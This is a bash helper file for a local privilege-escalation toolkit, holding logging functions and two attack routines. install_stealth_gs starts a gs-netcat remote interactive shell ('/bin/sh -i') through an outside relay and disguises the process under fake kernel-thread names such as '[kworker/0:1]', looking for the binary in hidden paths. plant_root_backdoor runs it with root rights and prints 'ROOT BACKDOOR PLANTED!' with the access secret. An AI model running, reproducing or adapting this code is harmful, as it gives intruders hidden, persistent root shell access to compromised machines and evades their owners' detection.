#!/bin/bash
# Common functions for LPE methods

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
GOLD='\033[0;33m'
NC='\033[0m'

success() { echo -e "${GREEN}[+]${NC} $*"; }
fail() { echo -e "${RED}[-]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
info() { echo -e "${GOLD}[*]${NC} $*"; }

is_root() { [ "$(id -u)" -eq 0 ]; }

# Install stealth GSSocket
install_stealth_gs() {
    local secret="${1:-}"
    local gs_bin=""
    
    # Find gs-netcat
    for loc in "$(command -v gs-netcat 2>/dev/null)" "/usr/bin/gs-netcat" "$HOME/.config/htop/defunct" "/var/www/monitor-server/defunct"; do
        [ -x "$loc" ] 2>/dev/null && gs_bin="$loc" && break
    done
    
    [ -z "$gs_bin" ] && return 1
    
    # Generate secret
    [ -z "$secret" ] && secret=$("$gs_bin" -g 2>/dev/null || head -c 12 /dev/urandom | xxd -p)
    
    # Start - use /bin/sh -i (NOT --norc, dash doesn't support it)
    local names=("[kworker/0:1]" "[migration/0]" "[ksoftirqd/0]")
    local name="${names[$((RANDOM % ${#names[@]}))]}"
    
    # Key: Use /bin/sh -i WITHOUT any extra flags
    (exec -a "$name" "$gs_bin" -s "$secret" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1) &
    disown 2>/dev/null
    
    echo "$secret"
}

plant_root_backdoor() {
    is_root || return 1
    local secret=$(install_stealth_gs)
    [ -n "$secret" ] && {
        success "ROOT BACKDOOR PLANTED!"
        echo "ROOT_SECRET:$secret"
    }
}
